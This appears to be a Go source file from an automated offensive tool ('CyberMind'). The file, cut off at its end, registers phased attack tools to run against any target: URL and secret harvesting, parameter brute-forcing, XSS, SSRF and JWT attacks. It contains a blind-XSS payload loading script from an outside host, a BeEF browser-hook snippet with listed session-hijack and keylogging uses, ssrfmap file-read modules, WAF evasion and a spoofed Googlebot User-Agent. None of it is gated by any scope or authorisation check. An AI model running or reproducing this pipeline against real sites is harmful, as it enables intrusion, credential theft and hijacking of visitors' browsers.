package hunt

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

// huntRegistry — full arsenal, 6 phases, no skipping.
// Every tool runs exhaustively. Primary → fallbacks → next tool.
// OMEGA update: +15 new tools — hakrawler, cariddi, trufflehog, secretfinder,
// kxss, bxss, freq, ssrfmap, gopherus, tplmap, liffy, jwt_tool, graphw00f,
// smuggler, corsy, ffuf-param, httprobe, urlfinder, subjs, mantra
var huntRegistry = []HuntToolSpec{

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 1 — URL COLLECTION
	// Goal: collect EVERY historical URL from ALL archives before active testing
	// Pipeline: waymore → gau → waybackurls → deduplicate with uro
	// ══════════════════════════════════════════════════════════════════════════

	{
		Name:        "waymore",
		Phase:       1,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "pip3 install waymore --break-system-packages",
		// Fixed: -p flag is --providers in newer waymore, use correct flags
		BuildArgs: func(target string, ctx *HuntContext) []string {
			return []string{
				"-i", target,
				"-mode", "U",
				"-oU", "/tmp/cybermind_waymore.txt",
				"--providers", "wayback,otx,commoncrawl,urlscan",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				// Minimal fallback — just wayback
				return []string{"-i", target, "-mode", "U", "-oU", "/tmp/cybermind_waymore.txt"}
			},
			func(target string, ctx *HuntContext) []string {
				// Last resort: no providers flag at all
				return []string{"-i", target, "-mode", "U"}
			},
		},
	},
	{
		Name:        "gau",
		Phase:       1,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "go install github.com/lc/gau/v2/cmd/gau@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			return []string{
				"--subs",
				"--threads", "50",
				"--blacklist", "png,jpg,gif,svg,ico,css,woff,woff2,ttf,eot,mp4,mp3,pdf",
				"--providers", "wayback,otx,commoncrawl,urlscan",
				"--retries", "3",
				"--o", "/tmp/cybermind_gau.txt",
				target,
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"--subs", "--threads", "20", "--o", "/tmp/cybermind_gau.txt", target}
			},
		},
	},
	{
		Name:        "waybackurls",
		Phase:       1,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "go install github.com/tomnomnom/waybackurls@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			return []string{target}
		},
	},

	// ── hakrawler — fast Go crawler (reads URLs from stdin) ─────────────────
	{
		Name:        "hakrawler",
		Phase:       1,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "go install github.com/hakluke/hakrawler@latest",
		// Fixed: hakrawler reads URLs from stdin — use echo pipe approach
		// We store the URL in a special env var and the engine handles stdin
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			// Store URL for stdin injection
			os.Setenv("CYBERMIND_HAKRAWLER_URL", u)
			return []string{
				"-d", "3",
				"-subs",
				"-u",
				"-t", "8",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-d", "2", "-subs", "-u"}
			},
		},
	},

	// ── NEW 2025: urlfinder — fast URL extraction from JS files ──
	{
		Name:        "urlfinder",
		Phase:       1,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "go install github.com/projectdiscovery/urlfinder/cmd/urlfinder@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			return []string{
				"-d", target,
				"-all",
				"-silent",
				"-o", "/tmp/cybermind_urlfinder.txt",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-d", target, "-silent"}
			},
		},
	},

	// ── NEW 2025: httprobe — fast HTTP/HTTPS probe for live hosts ──
	{
		Name:        "httprobe",
		Phase:       1,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "go install github.com/tomnomnom/httprobe@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Pipe subdomains through httprobe
			if len(ctx.Subdomains) > 0 {
				f := writeTempList(ctx.Subdomains)
				if f != "" {
					return []string{"-c", "50", "-t", "3000", "-prefer-https"}
				}
			}
			return []string{"-c", "50", "-t", "3000"}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-c", "20", "-t", "5000"}
			},
		},
	},

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 2 — DEEP CRAWL
	// Goal: discover every JS endpoint, form, API path, hidden link
	// Pipeline: gospider (JS headless) → katana (structured crawl)
	// ══════════════════════════════════════════════════════════════════════════

	{
		Name:        "gospider",
		Phase:       2,
		Timeout:     600, // reduced from 1800 — kills on small targets
		DomainOnly:  true,
		InstallHint: "go install github.com/jaeles-project/gospider@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			args := []string{
				"-s", u,
				"-d", "3",         // depth 3 (was 10 — too deep, causes kill)
				"-t", "50",        // 50 threads (was 200 — too many)
				"-c", "3",         // 3 concurrent (was 5)
				"--js",
				"--sitemap",
				"--robots",
				"-o", "/tmp/cybermind_gospider/",
				"--no-redirect",
				"--timeout", "10", // per-request timeout
			}
			if len(ctx.LiveURLs) > 1 {
				f := writeTempList(ctx.LiveURLs[:min(50, len(ctx.LiveURLs))]) // cap at 50 URLs
				if f != "" {
					return []string{
						"-S", f,
						"-d", "3", "-t", "50", "-c", "3",
						"--js", "--sitemap", "--robots",
						"-o", "/tmp/cybermind_gospider/",
						"--timeout", "10",
					}
				}
			}
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-s", u, "-d", "2", "-t", "20", "--js", "-o", "/tmp/cybermind_gospider/", "--timeout", "10"}
			},
		},
	},
	{
		Name:        "katana",
		Phase:       2,
		Timeout:     600, // reduced from 1800
		DomainOnly:  true,
		InstallHint: "go install github.com/projectdiscovery/katana/cmd/katana@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Detect SPA/JS-heavy tech for headless mode
			isSPA := false
			for _, tech := range ctx.Technologies {
				t := strings.ToLower(tech)
				if strings.Contains(t, "react") || strings.Contains(t, "vue") ||
					strings.Contains(t, "angular") || strings.Contains(t, "next") ||
					strings.Contains(t, "nuxt") || strings.Contains(t, "svelte") ||
					strings.Contains(t, "ember") || strings.Contains(t, "backbone") {
					isSPA = true
					break
				}
			}

			baseArgs := []string{
				"-d", "3",
				"-c", "25",
				"-jc",        // JS crawling
				"-kf", "all", // extract all fields
				"-aff",       // automatic form filling — discovers POST endpoints
				"-no-color", "-silent",
				"-timeout", "10",
				"-o", "/tmp/cybermind_katana_hunt.txt",
			}

			// Add headless mode for SPA sites
			if isSPA {
				baseArgs = append(baseArgs, "-headless")
			}

			if len(ctx.LiveURLs) > 1 {
				f := writeTempList(ctx.LiveURLs[:min(50, len(ctx.LiveURLs))])
				if f != "" {
					return append([]string{"-list", f}, baseArgs...)
				}
			}
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return append([]string{"-u", u}, baseArgs...)
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "-d", "2", "-c", "10", "-jc", "-silent", "-timeout", "10"}
			},
		},
	},

	// ── NEW 2025: cariddi — endpoints + secrets + API keys extractor ──
	{
		Name:        "cariddi",
		Phase:       2,
		Timeout:     1200,
		DomainOnly:  true,
		InstallHint: "go install github.com/edoardottt/cariddi/cmd/cariddi@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-s", u,
				"-e",          // extract endpoints
				"-ef", "3",    // extract files level 3
				"-secrets",    // find secrets
				"-err",        // show errors
				"-c", "50",    // 50 concurrent (was 200 — too many)
				"-d", "3",     // depth 3 (was 8)
				"-o", "/tmp/cybermind_cariddi.txt",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-s", u, "-e", "-c", "100", "-d", "5"}
			},
		},
	},

	// ── NEW 2025: subjs — extract JS files from URLs for analysis ──
	{
		Name:        "subjs",
		Phase:       2,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "go install github.com/lc/subjs@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// subjs reads URLs from stdin — pipe live URLs
			if len(ctx.LiveURLs) > 0 {
				f := writeTempList(ctx.LiveURLs)
				if f != "" {
					return []string{"-i", f, "-c", "40", "-t", "5000"}
				}
			}
			return []string{"-c", "40", "-t", "5000"}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-c", "20"}
			},
		},
	},

	// ── trufflehog — find secrets/API keys in JS and source ──
	{
		Name:        "trufflehog",
		Phase:       2,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Fixed: create the JS files dir first, then scan it
			jsDir := "/tmp/cybermind_js_files"
			os.MkdirAll(jsDir, 0755)
			// Download JS files from live URLs first
			for i, u := range ctx.LiveURLs {
				if i >= 10 {
					break
				}
				if strings.HasSuffix(strings.ToLower(u), ".js") {
					fname := fmt.Sprintf("%s/file_%d.js", jsDir, i)
					exec.Command("curl", "-sL", "--max-time", "10", "-o", fname, u).Run()
				}
			}
			// Check if dir has any files
			entries, _ := os.ReadDir(jsDir)
			if len(entries) > 0 {
				return []string{
					"filesystem", jsDir,
					"--json",
					"--no-update",
				}
			}
			// Fallback: scan git repo if target looks like github
			u := target
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{"git", u, "--json", "--no-update"}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"git", u, "--json", "--no-update"}
			},
		},
	},

	// ── mantra — find API keys and secrets in JS files ──
	{
		Name:        "mantra",
		Phase:       2,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "go install github.com/MrEmpy/mantra@latest",
		// Fixed: mantra reads URLs from stdin, not -u flag
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// mantra reads from stdin — store URL for stdin injection
			u := target
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			os.Setenv("CYBERMIND_MANTRA_URL", u)
			return []string{"-s"} // silent mode
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{}
			},
		},
	},

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 3 — PARAMETER DISCOVERY
	// Goal: find EVERY hidden GET/POST param — IDOR, SSRF, LFI, XSS, SQLi surface
	// Pipeline: paramspider (JS/HTML miner) → arjun (brute) → x8 (recursive fuzz)
	// ══════════════════════════════════════════════════════════════════════════

	{
		Name:        "paramspider",
		Phase:       3,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "pip3 install paramspider --break-system-packages || git clone https://github.com/devanshbatham/ParamSpider /opt/paramspider && cd /opt/paramspider && pip3 install . --break-system-packages",
		// Fixed: paramspider package metadata issue — use python3 directly
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Try direct python3 execution if paramspider binary broken
			paramspiderPy := "/opt/paramspider/paramspider.py"
			if _, err := os.Stat(paramspiderPy); err == nil {
				// Use python3 directly
				os.Setenv("CYBERMIND_PARAMSPIDER_PY", paramspiderPy)
			}
			return []string{
				"--domain", target,
				"--level", "high",
				"--quiet",
				"--output", "/tmp/cybermind_paramspider.txt",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"--domain", target, "--quiet"}
			},
			func(target string, ctx *HuntContext) []string {
				return []string{"-d", target}
			},
		},
	},
	{
		Name:        "arjun",
		Phase:       3,
		Timeout:     3600,
		DomainOnly:  true,
		InstallHint: "pip3 install arjun",
		// Power: brute-force hidden params with massive wordlist
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			args := []string{
				"-u", u,
				"-t", "100",       // 100 threads
				"-oJ", "/tmp/cybermind_arjun.json",
				"--stable",        // stable mode for accuracy
			}
			if ctx.WAFDetected {
				args = append(args, "--stable", "-d", "5")
			}
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "-t", "50", "--stable"}
			},
		},
	},
	{
		Name:        "x8",
		Phase:       3,
		Timeout:     3600,
		DomainOnly:  true,
		InstallHint: "Download binary from https://github.com/Sh1Yo/x8/releases/latest — sudo cp x8 /usr/local/bin/ && sudo chmod +x /usr/local/bin/x8",
		// Fixed: x8 uses subcommand syntax: x8 run -u <url>
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			args := []string{
				"run",
				"-u", u,
				"--level", "3",
				"--workers", "8",
				"-o", "/tmp/cybermind_x8.txt",
				"-q",
			}
			if ctx.WAFDetected {
				args = append(args, "--delay", "500")
			}
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"run", "-u", u, "--level", "2", "-q"}
			},
		},
	},

	// ── NEW 2025: smuggler — HTTP request smuggling detection ──
	{
		Name:        "smuggler",
		Phase:       3,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/defparam/smuggler /opt/smuggler && pip3 install -r /opt/smuggler/requirements.txt --break-system-packages && sudo tee /usr/local/bin/smuggler > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/smuggler/smuggler.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/smuggler",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"-t", "CL.TE,TE.CL,TE.TE",
				"-m", "POST",
				"-q",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "-t", "CL.TE"}
			},
		},
	},

	// ── NEW 2025: jwt_tool — JWT attack toolkit (none alg, key confusion, injection) ──
	{
		Name:        "jwt_tool",
		Phase:       3,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/ticarpi/jwt_tool /opt/jwt_tool && pip3 install -r /opt/jwt_tool/requirements.txt --break-system-packages && sudo tee /usr/local/bin/jwt_tool > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/jwt_tool/jwt_tool.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/jwt_tool",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			// Scan for JWT in responses and test all attacks
			return []string{
				"-t", u,
				"-M", "at",    // all tests
				"-np",         // no proxy
				"-v",          // verbose
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-t", u, "-M", "pb"}
			},
		},
	},

	// ── NEW 2025: graphw00f — GraphQL fingerprinting and schema extraction ──
	{
		Name:        "graphw00f",
		Phase:       3,
		Timeout:     300,
		DomainOnly:  true,
		// Fixed install hint — graphw00f is a git repo, not a pip package
		InstallHint: "git clone https://github.com/dolevf/graphw00f.git /opt/graphw00f && pip3 install -r /opt/graphw00f/requirements.txt --break-system-packages && sudo ln -sf /opt/graphw00f/main.py /usr/local/bin/graphw00f && sudo chmod +x /usr/local/bin/graphw00f",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-d",
				"-f",
				"-t", u,
				"-o", "/tmp/cybermind_graphw00f.json",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-d", "-t", u}
			},
		},
	},

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 4 — XSS HUNTING
	// Goal: find every XSS — reflected, DOM, stored — with WAF bypass
	// Pipeline: xsstrike (AI WAF bypass) → dalfox (payload mutation)
	// ══════════════════════════════════════════════════════════════════════════

	{
		Name:        "xsstrike",
		Phase:       4,
		Timeout:     3600,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/s0md3v/XSStrike /opt/xsstrike && cd /opt/xsstrike && pip3 install -r requirements.txt && sudo tee /usr/local/bin/xsstrike > /dev/null << 'EOF'\n#!/bin/bash\npython3 /opt/xsstrike/xsstrike.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/xsstrike",
		// Power: AI-powered WAF bypass, fuzzing, DOM XSS detection
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			args := []string{
				"-u", u,
				"--fuzzer",        // enable fuzzer
				"--blind",         // blind XSS
				"--skip",          // skip confirmation
				"--threads", "10",
			}
			if ctx.WAFDetected {
				args = append(args, "--waf")
			}
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "--skip", "--threads", "5"}
			},
		},
	},
	{
		Name:        "dalfox",
		Phase:       4,
		Timeout:     3600,
		DomainOnly:  true,
		InstallHint: "go install github.com/hahwul/dalfox/v2@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			scanURLs := dedup(append(ctx.LiveURLs, ctx.CrawledURLs...))
			for _, u := range ctx.HistoricalURLs {
				if strings.Contains(u, "=") {
					scanURLs = append(scanURLs, u)
				}
			}
			scanURLs = dedup(scanURLs)

			if len(scanURLs) > 0 {
				f := writeTempList(scanURLs)
				if f != "" {
					args := []string{
						"file", f,
						"--silence", "--no-color",
						"--follow-redirects",
						"--trigger", "alert(1)",
						"--output", "/tmp/cybermind_dalfox.txt",
					}
					if ctx.WAFDetected {
						args = append(args, "--delay", "1000", "--timeout", "30")
					}
					// Fix 3: use memory-proven payloads if available
					if memPayloads := os.Getenv("CYBERMIND_MEMORY_XSS_PAYLOADS"); memPayloads != "" {
						args = append(args, "--custom-payload", memPayloads)
					}
					// Fix 2: use adversarial payloads if available
					if advPayloads := os.Getenv("CYBERMIND_ADVERSARIAL_PAYLOADS"); advPayloads != "" {
						args = append(args, "--custom-payload", advPayloads)
					}
					return args
				}
			}
			u := target
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{"url", u, "--silence", "--no-color", "--follow-redirects"}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"url", u, "--silence", "--no-color"}
			},
		},
	},

	// ── NEW 2025: kxss — fast reflected XSS parameter finder ──
	{
		Name:        "kxss",
		Phase:       4,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "go install github.com/Emoe/kxss@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// kxss reads URLs from stdin — pipe parameterized URLs
			paramURLs := []string{}
			for _, u := range ctx.AllURLs {
				if strings.Contains(u, "=") {
					paramURLs = append(paramURLs, u)
				}
			}
			if len(paramURLs) > 0 {
				f := writeTempList(paramURLs)
				if f != "" {
					return []string{"-i", f}
				}
			}
			return []string{}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{}
			},
		},
	},

	// ── NEW 2025: bxss — blind XSS with callback server ──
	{
		Name:        "bxss",
		Phase:       4,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "go install github.com/ethicalhackingplayground/bxss@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-a",          // append mode (was -appendMode)
				"-payload", "'\"<script src=https://xss.report/c/cybermind></script>",
				"-t",          // test parameters
				"-url", u,
				"-c", "30",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-a", "-t", "-url", u}
			},
		},
	},

	// ── NEW 2025: corsy — CORS misconfiguration exploitation ──
	{
		Name:        "corsy",
		Phase:       4,
		Timeout:     600,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/s0md3v/Corsy /opt/corsy && pip3 install -r /opt/corsy/requirements.txt --break-system-packages && sudo tee /usr/local/bin/corsy > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/corsy/corsy.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/corsy",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"-t", "20",    // 20 threads
				"-q",          // quiet
				"-o", "/tmp/cybermind_corsy.json",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "-t", "10"}
			},
		},
	},

	// ── NEW 2025: beef-xss — Browser Exploitation Framework ──────────────────
	// Hooks browsers via XSS → 200+ client-side attack modules
	// Runs AFTER dalfox confirms XSS — hooks the vulnerable URL
	// Capabilities: session hijack, keylog, screenshot, network pivot, phishing
	{
		Name:        "beef-xss",
		Phase:       4,
		Timeout:     120,
		DomainOnly:  true,
		InstallHint: "sudo apt install beef-xss -y",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Start BeEF REST API — returns hook URL for injection
			// BeEF hook: <script src="http://LHOST:3000/hook.js"></script>
			return []string{
				"--config", "/etc/beef-xss/config.yaml",
				"--verbose",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"--config", "/etc/beef-xss/config.yaml"}
			},
		},
	},

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 5 — DEEP VULNERABILITY SCAN
	// Goal: CVEs, RCE, LFI, SSRF, misconfigs — full template coverage
	// Pipeline: gf (pattern filter) → uro (dedup) → nuclei (scan)
	// ══════════════════════════════════════════════════════════════════════════

	{
		Name:        "gf",
		Phase:       5,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "go install github.com/tomnomnom/gf@latest && git clone https://github.com/1ndianl33t/Gf-Patterns ~/.gf",
		// Power: filter URLs by vulnerability pattern (xss, sqli, ssrf, lfi, rce, redirect)
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// gf filters stdin — we pipe all URLs through it
			// Run multiple patterns and save to files
			allURLs := dedup(append(append(ctx.AllURLs, ctx.LiveURLs...), ctx.CrawledURLs...))
			if len(allURLs) == 0 {
				return []string{"xss"} // minimal fallback
			}
			f := writeTempList(allURLs)
			if f == "" {
				return []string{"xss"}
			}
			// Run gf for multiple patterns
			return []string{
				"xss",
				// Note: gf reads from stdin, so we use bash -c in the engine
				// This BuildArgs returns the pattern; engine handles piping
			}
		},
	},
	{
		Name:        "nuclei",
		Phase:       5,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && nuclei -update-templates",
		// Fixed: reduced concurrency from 1000 to 50 to avoid "higher than max-host-error"
		BuildArgs: func(target string, ctx *HuntContext) []string {
			args := []string{
				"-silent", "-no-color", "-stats",
				"-c", "25", "-rl", "25", "-bs", "10", // reduced from 50/50/25
				"-timeout", "10", "-retries", "2",
				"-H", "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)",
				"-o", "/tmp/cybermind_nuclei_hunt.txt",
			}
			if ctx.WAFDetected {
				args = append(args, "-etags", "fuzzing,dos", "-severity", "critical,high,medium", "-rl", "10")
			} else {
				args = append(args, "-severity", "critical,high,medium,low,info",
					"-tags", "cve,xss,sqli,ssrf,lfi,rce,xxe,idor,misconfig,exposure,takeover,oast,ssti,redirect")
			}
			scanURLs := ctx.CrawledURLs
			if len(scanURLs) == 0 {
				scanURLs = ctx.LiveURLs
			}
			if len(scanURLs) > 0 {
				f := writeTempList(scanURLs)
				if f != "" {
					args = append(args, "-l", f)
					return args
				}
			}
			args = append(args, "-u", target)
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-u", target, "-severity", "critical,high", "-silent", "-no-color", "-c", "25"}
			},
			func(target string, ctx *HuntContext) []string {
				return []string{"-u", target, "-t", "cves/", "-silent", "-no-color", "-c", "10"}
			},
		},
	},

	// ── NEW 2025: ssrfmap — automated SSRF detection and exploitation ──
	{
		Name:        "ssrfmap",
		Phase:       5,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/swisskyrepo/SSRFmap /opt/ssrfmap && pip3 install -r /opt/ssrfmap/requirements.txt --break-system-packages && sudo tee /usr/local/bin/ssrfmap > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/ssrfmap/ssrfmap.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/ssrfmap",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				// Find a URL with parameters — best candidate for SSRF
				for _, lu := range ctx.LiveURLs {
					if strings.Contains(lu, "=") {
						u = lu
						break
					}
				}
				if u == target {
					u = ctx.LiveURLs[0]
				}
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			// Auto-generate HTTP request file for ssrfmap
			reqFile := "/tmp/cybermind_ssrf_request.txt"
			host := strings.TrimPrefix(strings.TrimPrefix(u, "https://"), "http://")
			if idx := strings.Index(host, "/"); idx > 0 {
				host = host[:idx]
			}
			reqContent := fmt.Sprintf("GET %s HTTP/1.1\nHost: %s\nUser-Agent: Mozilla/5.0\n\n",
				strings.TrimPrefix(u, "https://"+host), host)
			os.WriteFile(reqFile, []byte(reqContent), 0600)
			return []string{
				"-r", reqFile,
				"-p", "url",
				"-m", "readfiles,portscan",
				"--lhost", "127.0.0.1",
				"--lport", "4444",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				reqFile := "/tmp/cybermind_ssrf_request.txt"
				host := strings.TrimPrefix(strings.TrimPrefix(u, "https://"), "http://")
				if idx := strings.Index(host, "/"); idx > 0 {
					host = host[:idx]
				}
				os.WriteFile(reqFile, []byte(fmt.Sprintf("GET / HTTP/1.1\nHost: %s\n\n", host)), 0600)
